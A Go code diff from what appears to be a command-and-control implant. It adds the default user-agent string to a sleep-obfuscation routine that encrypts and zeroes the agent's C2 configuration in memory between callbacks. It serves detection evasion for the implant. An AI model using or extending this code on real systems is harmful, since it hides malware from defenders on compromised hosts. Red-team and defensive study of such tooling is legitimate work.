@@ -53,10 +53,11 @@ type agentSensitiveData struct {
 	OS              string `json:"o,omitempty"`
 	KillDate        int64  `json:"k,omitempty"`
 	DefaultPPID     int    `json:"pp,omitempty"`
-	JitterProfile   string `json:"jp,omitempty"`
-	WorkingHrsStart int    `json:"ws,omitempty"`
-	WorkingHrsEnd   int    `json:"we,omitempty"`
-	WorkingDays     []int  `json:"wd,omitempty"`
+	JitterProfile    string `json:"jp,omitempty"`
+	WorkingHrsStart  int    `json:"ws,omitempty"`
+	WorkingHrsEnd    int    `json:"we,omitempty"`
+	WorkingDays      []int  `json:"wd,omitempty"`
+	DefaultUserAgent string `json:"ua,omitempty"`
 }
 
 // profileSensitiveData holds the HTTP C2 profile fields that reveal the
@@ -124,10 +125,11 @@ func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
 		OS:              agent.OS,
 		KillDate:        agent.KillDate,
 		DefaultPPID:     agent.DefaultPPID,
-		JitterProfile:   agent.JitterProfile,
-		WorkingHrsStart: agent.WorkingHoursStart,
-		WorkingHrsEnd:   agent.WorkingHoursEnd,
-		WorkingDays:     agent.WorkingDays,
+		JitterProfile:    agent.JitterProfile,
+		WorkingHrsStart:  agent.WorkingHoursStart,
+		WorkingHrsEnd:    agent.WorkingHoursEnd,
+		WorkingDays:      agent.WorkingDays,
+		DefaultUserAgent: commands.DefaultUserAgent,
 	}
 	plaintext, err := json.Marshal(ad)
 	if err != nil {
@@ -159,6 +161,7 @@ func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
 	agent.WorkingHoursStart = 0
 	agent.WorkingHoursEnd = 0
 	agent.WorkingDays = nil
+	commands.DefaultUserAgent = ""
 
 	// --- Encrypt HTTP C2 profile ---
 	// Skip if the config vault is active — fields are already encrypted at rest
@@ -249,6 +252,7 @@ func deobfuscateSleep(vault *sleepVault, agent *structs.Agent, c2 profiles.Profi
 				agent.WorkingHoursStart = ad.WorkingHrsStart
 				agent.WorkingHoursEnd = ad.WorkingHrsEnd
 				agent.WorkingDays = ad.WorkingDays
+				commands.DefaultUserAgent = ad.DefaultUserAgent
 			}
 			zeroBytes(plaintext)
 		}
